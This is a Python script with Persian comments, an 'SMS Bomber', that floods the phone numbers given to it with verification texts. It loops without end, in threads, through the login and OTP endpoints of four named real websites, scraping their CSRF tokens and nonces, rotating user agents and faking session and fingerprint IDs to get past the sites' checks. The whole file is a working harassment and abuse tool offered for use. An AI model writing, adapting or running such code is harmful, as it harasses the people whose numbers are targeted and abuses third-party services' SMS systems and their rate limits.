import requests
import re
import uuid
from threading import Thread
from time import sleep
import socket
import urllib3
import random

# غیرفعال کردن هشدارهای urllib3
urllib3.disable_warnings()

# رنگ‌ها برای خروجی
r, g, y, a = '\033[31;1m', '\033[32;1m', '\033[33;1m', '\033[0m'

# ==========================
# بررسی اتصال اینترنت
# ==========================
def check_internet():
    try:
        socket.gethostbyname("smtp.gmail.com")
        return True
    except socket.gaierror:
        return False

# ==========================
# اعتبارسنجی شماره‌ها
# ==========================
def is_phone(phone_input: str):
    phones = phone_input.split('-')
    valid_phones = []
    for phone in phones:
        phone = phone.strip()
        if re.match(r"^(?:\+989|989|09|9)\d{9}$", phone):
            valid_phones.append(re.sub(r"^(?:\+989|989|09|9)", "+989", phone))
        else:
            print(f"{r}[-] Invalid Phone: {phone}{a}")
    return valid_phones if valid_phones else False

# ==========================
# تابع ارسال ایمن
# ==========================
def send_service_safe(service, phone):
    try:
        service(phone)
    except Exception as e:
        print(f"{r}[!] {service.__name__} Exception for {phone}: {e}{a}")

# ==========================
# توابع سرویس‌ها
# ==========================
def nillarayeshi(phone):
    user_agents = [
        "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (Android 13; Mobile; rv:109.0) Gecko/109.0 Firefox/109.0",
        "Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Safari/605.1.15"
    ]
    formatted_phone = re.sub(r'[^0-9]', '', phone.replace("+98", ""))
    try:
        session = requests.Session()
        home_response = session.get("https://nillarayeshi.com/", timeout=10, headers={"User-Agent": random.choice(user_agents)})
        home_response.encoding = 'utf-8'
        csrf_match = re.search(r'name="csrf" value="([a-f0-9]+)"', home_response.text)
        nonce_match = re.search(r'name="dig_nounce" value="([a-f0-9]+)"', home_response.text)
        csrf = csrf_match.group(1) if csrf_match else "b77d25383c"
        nonce = nonce_match.group(1) if nonce_match else "b77d25383c"
        url = "https://nillarayeshi.com/wp-admin/admin-ajax.php"
        payload = {
            "action": "digits_check_mob",
            "countrycode": "+98",
            "mobileNo": formatted_phone,
            "csrf": csrf,
            "login": "2",
            "username": "",
            "email": "",
            "captcha": "",
            "captcha_ses": "",
            "digits": "1",
            "json": "1",
            "whatsapp": "0",
            "digits_reg_name": "نام",
            "digregcode": "+98",
            "digits_reg_mail": formatted_phone,
            "digregscode2": "+98",
            "mobmail2": "",
            "digits_reg_password": "",
            "dig_otp": "",
            "code": "",
            "dig_reg_mail": "",
            "dig_nounce": nonce
        }
        headers = {
            "User-Agent": random.choice(user_agents),
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Accept": "*/*",
            "X-Requested-With": "XMLHttpRequest",
            "Origin": "https://nillarayeshi.com",
            "Referer": "https://nillarayeshi.com/",
        }
        response = session.post(url, data=payload, headers=headers, timeout=10)
        response.encoding = 'utf-8'
        if response.status_code == 200:
            try:
                data = response.json()
                if data.get("success") or "sent" in str(data).lower():
                    print(f'{g}(nillarayeshi) Code Sent to {phone}{a}')
                else:
                    print(f'{r}[-] (nillarayeshi) Failed: {data.get("message", "Unknown")}{a}')
            except ValueError:
                if "1" in response.text or "sent" in response.text.lower():
                    print(f'{g}(nillarayeshi) Code Sent to {phone}{a}')
        else:
            print(f"{r}[-] (nillarayeshi) HTTP Error: {response.status_code}{a}")
    except Exception as e:
        print(f"{r}[!] nillarayeshi Exception: {e}{a}")

def vitrin_shop(phone):
    formatted_phone = "0" + re.sub(r'[^0-9]', '', phone.replace("+98", ""))
    try:
        session = requests.Session()
        home_response = session.get("https://www.vitrin.shop/", timeout=10)
        fresh_token = session.cookies.get('XSRF-TOKEN', "default-token")
        url = "https://www.vitrin.shop/api/v1/user/request_code"
        payload = {"phone_number": formatted_phone, "forgot_password": False}
        headers = {
            "User-Agent": "Mozilla/5.0",
            "Accept": "application/json",
            "Content-Type": "application/json; charset=UTF-8",
            "V-Session-ID": str(uuid.uuid4()),
            "V-Fingerprint-ID": str(uuid.uuid4()),
            "X-XSRF-TOKEN": fresh_token,
        }
        response = requests.post(url, json=payload, headers=headers, timeout=10)
        if response.status_code == 200:
            print(f'{g}(vitrin_shop) Code Sent to {phone}{a}')
        else:
            print(f"{r}[-] (vitrin_shop) HTTP Error: {response.status_code}{a}")
    except Exception as e:
        print(f"{r}[!] vitrin_shop Exception: {e}{a}")

def elanza(phone):
    formatted_phone = "0" + re.sub(r'[^0-9]', '', phone.replace("+98", ""))
    try:
        url = "https://api.elanza.com/auth/request"
        payload = {"contact": formatted_phone}
        headers = {"User-Agent": "Mozilla/5.0", "Content-Type": "application/json"}
        response = requests.post(url, json=payload, headers=headers, timeout=10)
        if response.status_code == 200:
            print(f'{g}(elanza) Code Sent to {phone}{a}')
        else:
            print(f"{r}[-] (elanza) HTTP Error: {response.status_code}{a}")
    except Exception as e:
        print(f"{r}[!] elanza Exception: {e}{a}")

import requests
import re
import random

def ilozi(phone):
    try:
        digits_phone = phone.replace("+98", "")
        session = requests.Session()
        
        # لیست User-Agent های مختلف
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15"
        ]
        
        headers = {
            "User-Agent": random.choice(user_agents),
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "X-Requested-With": "XMLHttpRequest",
            "Origin": "https://ilozi.com",
            "Referer": "https://ilozi.com/?login=true&page=2",
        }

        # دریافت صفحه اول
        home_response = session.get("https://ilozi.com/?login=true&page=2", 
                                   timeout=10, headers=headers)
        
        # استخراج مقادیر مورد نیاز
        instance_id = re.search(r'name="instance_id" value="([a-f0-9]+)"', home_response.text)
        digits_form = re.search(r'name="digits_form" value="([a-f0-9]+)"', home_response.text)

        # آماده سازی داده‌ها
        payload = {
            "login_digt_countrycode": "+98",
            "digits_phone": digits_phone,
            "action_type": "phone",
            "sms_otp": "",
            "otp_step_1": "1",
            "digits_otp_field": "1",
            "digits": "1",
            "instance_id": instance_id.group(1) if instance_id else "6fb17492e0d343df4e533a9deb8ba6b9",
            "action": "digits_forms_ajax",
            "type": "login",
            "digits_redirect_page": "https://ilozi.com/my-account/?action=register",
            "digits_form": digits_form.group(1) if digits_form else "3780032f76",
            "_wp_http_referer": "/?login=true&page=2",
            "show_force_title": "1",
            "otp_resend": "true",
            "container": "digits_protected",
            "sub_action": "sms_otp"
        }

        # ارسال درخواست
        response = session.post("https://ilozi.com/wp-admin/admin-ajax.php", 
                               data=payload, headers=headers, timeout=10)

        # بررسی پاسخ
        if response.status_code == 200:
            if response.text.strip() == "1" or (response.json().get("success") if response.text else False):
                return True
        
        return False
            
    except Exception:
        return False
        
# ==========================
# لیست سرویس‌ها (می‌توانی همه سرویس‌های V4 را اضافه کنی)
# ==========================
services = [vitrin_shop, ilozi, elanza, nillarayeshi]  

# ==========================
# تابع VIP مولتی‌تردینگ
# ==========================
def vip(phones, delay=0.1):
    print(f"{g}Targets: {y}{', '.join(phones)}{a}")
    print(f"{g}Services Loaded: {y}{len(services)}{a}")
    print(f"{g}Delay: {y}{delay}s{a}")
    try:
        while True:
            for phone in phones:
                for service in services:
                    Thread(target=send_service_safe, args=(service, phone)).start()
                    sleep(delay)
    except KeyboardInterrupt:
        print(f"{g}[+] Mission Completed!{a}")

# ==========================
# منوی اصلی
# ==========================
def main_menu():
    print(f"""
{y}╔════════════════════════════════════════════╗
{g}║         SMS Bomber by M.M.]R               ║
{y}╚════════════════════════════════════════════╝
{g} Coded by: {r}M.M.]R{a}
{y}══════════════════════════════════════════════
{g} Services Loaded: {y}{len(services)}{a}
{g} Enter phone numbers (separated by - for multiple):
{a} Example: +989123456789-+989987654321
{y}══════════════════════════════════════════════
""")

# ==========================
# نقطه ورود
# ==========================
if __name__ == "__main__":
    if not check_internet():
        print(f"{r}[-] No internet connection!{a}")
    else:
        main_menu()
        phones = None
        while not phones:
            phone_input = input(f'{g}[?] Enter Phone(s) (+98): {a}')
            phones = is_phone(phone_input)
            if not phones:
                print(f"{r}[-] No valid phones entered!{a}")
        try:
            delay = float(input(f'{g}[?] Delay (seconds) [Default=0.1]: {a}') or 0.1)
        except ValueError:
            delay = 0.1
        vip(phones, delay)
